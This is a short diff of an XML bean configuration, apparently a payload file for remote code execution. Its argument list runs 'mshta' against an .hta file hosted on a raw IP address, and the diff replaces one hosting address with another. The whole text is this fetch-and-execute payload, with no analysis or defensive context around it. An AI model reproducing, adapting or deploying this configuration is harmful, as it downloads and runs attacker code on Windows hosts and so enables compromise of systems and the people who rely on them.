@@ -7,7 +7,7 @@
         <constructor-arg>
             <list>
                 <value>mshta</value>
-                <value>http://86.19.153.36/config/service.hta</value>
+                <value>http://176.115.255.17:81/config/service.hta</value>
             </list>
         </constructor-arg>
     </bean>
